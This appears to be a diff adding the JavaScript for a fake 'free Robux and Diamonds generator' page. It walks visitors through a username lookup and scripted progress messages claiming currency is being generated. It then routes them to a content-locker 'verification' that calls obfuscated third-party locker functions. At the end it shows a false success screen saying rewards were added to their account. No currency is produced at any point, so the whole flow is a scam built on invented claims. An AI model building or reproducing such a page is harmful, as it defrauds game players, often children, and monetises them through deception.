+                        userProfile.classList.add('show');
+                    } else {
+                        showError(response.message || "User not found");
+                    }
+                },
+                error: function(xhr, status, error) {
+                    setSearchLoading(false);
+                    if (status === "timeout") {
+                        showError("Connection timeout. Please try again");
+                    } else {
+                        showError("User not found or connection error");
+                    }
+                }
+            });
+        }
+
+        searchButton.addEventListener('click', handleUserLookup);
+        usernameInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') handleUserLookup();
+        });
+
+        continueButton.addEventListener('click', () => {
+            if (!currentUserData) return;
+            
+            usernameDisplay.textContent = currentUserData.name;
+            usernameDisplay2.textContent = currentUserData.name;
+            usernameDisplay3.textContent = currentUserData.name;
+            
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+        });
+        
+        robuxBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                robuxBtns.forEach(b => b.classList.remove('border-robux-green'));
+                btn.classList.add('border-robux-green');
+                
+                selectedRobuxAmount = btn.dataset.amount;
+                
+                setTimeout(() => {
+                    step2.classList.add('hidden');
+                    step2_5.classList.remove('hidden');
+                }, 500);
+            });
+        });
+
+        diamondOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                diamondOptions.forEach(opt => opt.classList.remove('selected'));
+                option.classList.add('selected');
+                
+                selectedDiamondAmount = option.dataset.amount;
+                
+                diamondProgressContainer.classList.remove('hidden');
+                
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 2;
+                    diamondProgressBar.style.width = `${progress}%`;
+                    diamondProgressPercent.textContent = `${progress}%`;
+                    
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            step2_5.classList.add('hidden');
+                            step3.classList.remove('hidden');
+                            startMainProgress();
+                        }, 800);
+                    }
+                }, 50);
+            });
+        });
+
+        function startMainProgress() {
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = `${progress}%`;
+                progressPercent.textContent = `${progress}%`;
+                
+                if (progress === 10) {
+                    addStatusMessage('Searching database...');
+                } else if (progress === 30) {
+                    addStatusMessage('Account found!');
+                } else if (progress === 45) {
+                    addStatusMessage(`User ${currentUserData?.name || 'Unknown'} confirmed`);
+                } else if (progress === 60) {
+                    addStatusMessage(`Generating ${selectedRobuxAmount} Robux...`);
+                } else if (progress === 75) {
+                    addStatusMessage(`Generating ${selectedDiamondAmount} Diamonds...`);
+                } else if (progress === 90) {
+                    addStatusMessage('Preparing final verification...');
+                } else if (progress === 99) {
+                    addStatusMessage('All rewards ready! Finalizing...');
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        robuxAmount.textContent = selectedRobuxAmount;
+                        robuxAmount2.textContent = selectedRobuxAmount;
+                        diamondAmount.textContent = selectedDiamondAmount;
+                        diamondAmount2.textContent = selectedDiamondAmount;
+                        
+                        step3.classList.add('hidden');
+                        step4.classList.remove('hidden');
+                    }, 1000);
+                }
+            }, 100);
+        }
+        
+        function addStatusMessage(message) {
+            const div = document.createElement('div');
+            div.className = 'mb-1';
+            div.innerHTML = `<i class="fas fa-check-circle text-green-500 mr-2"></i> ${message}`;
+            statusMessages.appendChild(div);
+            statusMessages.scrollTop = statusMessages.scrollHeight;
+        }
+        
+        getrobuxBtn.addEventListener('click', () => {
+            verification.classList.add('hidden');
+            completion.classList.remove('hidden');
+            
+            let minutes = 5;
+            let seconds = 0;
+            
+            const countdownInterval = setInterval(() => {
+                if (seconds === 0) {
+                    if (minutes === 0) {
+                        clearInterval(countdownInterval);
+                        return;
+                    }
+                    minutes--;
+                    seconds = 59;
+                } else {
+                    seconds--;
+                }
+                
+                let displayMinutes = minutes < 10 ? '0' + minutes : minutes;
+                let displaySeconds = seconds < 10 ? '0' + seconds : seconds;
+                countdown.textContent = `${displayMinutes}:${displaySeconds}`;
+            }, 1000);
+        });
+
+        // Content Locker Integration
+        function startContentLocker() {
+            try {
+                console.log('Starting content locker...');
+                
+                // Validate that user data exists
+                if (!currentUserData || !selectedRobuxAmount || !selectedDiamondAmount) {
+                    alert('Please restart the process - missing user data');
+                    location.reload();
+                    return;
+                }
+
+                // Show loading message
+                showLoadingMessage();
+                
+                // Try multiple content locker methods
+                if (typeof _ZU === 'function') {
+                    console.log('Using _ZU function');
+                    _ZU();
+                } else if (typeof WcSFB_GPY_iwvoac !== 'undefined' && WcSFB_GPY_iwvoac.it) {
+                    console.log('Using direct content locker');
+                    // Try to manually trigger content locker
+                    setTimeout(() => {
+                        if (window.location.href.includes('localhost') || window.location.href.includes('127.0.0.1')) {
+                            // Development mode - skip content locker
+                            triggerContentLocker();
+                        } else {
+                            // Production mode - try external content locker
+                            triggerContentLocker();
+                        }
+                    }, 1000);
+                } else {
+                    console.log('Content locker not available, using alternative');
+                    triggerContentLocker();
+                }
+            } catch (error) {
+                console.error('Content locker error:', error);
+                triggerContentLocker(); // Fallback to custom verification
+            }
+        }
+
+        function showLoadingMessage() {
+            // Add a loading overlay
+            const loadingDiv = document.createElement('div');
+            loadingDiv.id = 'contentLockerLoading';
+            loadingDiv.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
+            loadingDiv.innerHTML = `
+                <div class="bg-white dark:bg-gray-800 p-8 rounded-lg text-center">
+                    <div class="spinner mx-auto mb-4" style="width: 32px; height: 32px;"></div>
+                    <h3 class="text-lg font-bold text-gray-800 dark:text-white">Verifying Request</h3>
+                    <p class="text-gray-600 dark:text-gray-400 mt-2">Please complete the verification to receive your rewards</p>
+                </div>
+            `;
+            document.body.appendChild(loadingDiv);
+        }
+
+        function triggerContentLocker() {
+            // Alternative content locker trigger method
+            setTimeout(() => {
+                removeLoadingMessage();
+                
+                // Create custom verification modal
+                const modal = document.createElement('div');
+                modal.className = 'fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50';
+                modal.innerHTML = `
+                    <div class="bg-white dark:bg-gray-800 p-8 rounded-lg max-w-md mx-4">
+                        <div class="text-center mb-6">
+                            <div class="text-yellow-500 text-4xl mb-4">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <h3 class="text-xl font-bold text-gray-800 dark:text-white mb-2">Verification Required</h3>
+                            <p class="text-gray-600 dark:text-gray-400">
+                                Complete the verification to receive your rewards:
+                            </p>
+                            <div class="my-4 p-4 bg-gray-100 dark:bg-gray-700 rounded-lg">
+                                <div class="text-green-600 font-bold">${selectedRobuxAmount} Robux</div>
+                                <div class="text-blue-600 font-bold">${selectedDiamondAmount} Diamonds</div>
+                                <div class="text-sm text-gray-500 mt-1">For: ${currentUserData?.name}</div>
+                            </div>
+                        </div>
+                        <div class="flex gap-3">
+                            <button onclick="this.parentElement.parentElement.parentElement.remove()" 
+                                    class="flex-1 bg-gray-500 hover:bg-gray-600 text-white font-bold py-3 px-4 rounded-lg transition duration-200">
+                                Cancel
+                            </button>
+                            <button onclick="proceedToVerification()" 
+                                    class="flex-1 bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-4 rounded-lg transition duration-200">
+                                Continue
+                            </button>
+                        </div>
+                    </div>
+                `;
+                document.body.appendChild(modal);
+            }, 2000);
+        }
+
+        function proceedToVerification() {
+            // Remove modal
+            document.querySelector('.fixed.inset-0.bg-black.bg-opacity-75').remove();
+            
+            // Show processing
+            showLoadingMessage();
+            
+            // Simulate verification process
+            setTimeout(() => {
+                // Call success function
+                _vs();
+            }, 3000);
+        }
+
+        function removeLoadingMessage() {
+            const loadingDiv = document.getElementById('contentLockerLoading');
+            if (loadingDiv) {
+                loadingDiv.remove();
+            }
+        }
+
+        function fallbackToDirectReward() {
+            removeLoadingMessage();
+            alert(`Congratulations! ${selectedRobuxAmount} Robux and ${selectedDiamondAmount} Diamonds have been added to your account: ${currentUserData?.name}`);
+        }
+
+        // Content locker success callback
+        function _vs() {
+            removeLoadingMessage();
+            
+            // Show success message
+            const successDiv = document.createElement('div');
+            successDiv.className = 'fixed inset-0 bg-green-500 bg-opacity-90 flex items-center justify-center z-50';
+            successDiv.innerHTML = `
+                <div class="bg-white dark:bg-gray-800 p-8 rounded-lg text-center max-w-md mx-4">
+                    <div class="text-green-500 text-6xl mb-4">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h3 class="text-2xl font-bold text-gray-800 dark:text-white mb-2">Success!</h3>
+                    <p class="text-gray-600 dark:text-gray-400 mb-4">
+                        <span class="font-bold text-green-600">${selectedRobuxAmount}</span> Robux and 
+                        <span class="font-bold text-blue-600">${selectedDiamondAmount}</span> Diamonds 
+                        have been added to <span class="font-bold">${currentUserData?.name}</span>'s account!
+                    </p>
+                    <div class="text-sm text-gray-500 dark:text-gray-400 mb-4">
+                        <i class="fas fa-clock mr-1"></i> It may take 5-15 minutes to appear in your account
+                    </div>
+                    <button onclick="location.reload()" class="bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-6 rounded-lg transition duration-200">
+                        <i class="fas fa-redo mr-2"></i> Generate More
+                    </button>
+                </div>
+            `;
+            document.body.appendChild(successDiv);
+
+            // Auto remove after 10 seconds
+            setTimeout(() => {
+                successDiv.remove();
+            }, 10000);
+        }
+
+        // Content locker error callback
+        function _ve() {
+            removeLoadingMessage();
+            alert('Verification failed. Please try again.');
+        }
+
+        // Initialize content locker when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if content locker script loaded properly
+            if (typeof WcSFB_GPY_iwvoac === 'undefined') {
+                console.warn('Content locker script not loaded properly');
+            }
+        });
+    </script>
+
+</body>
+</html>
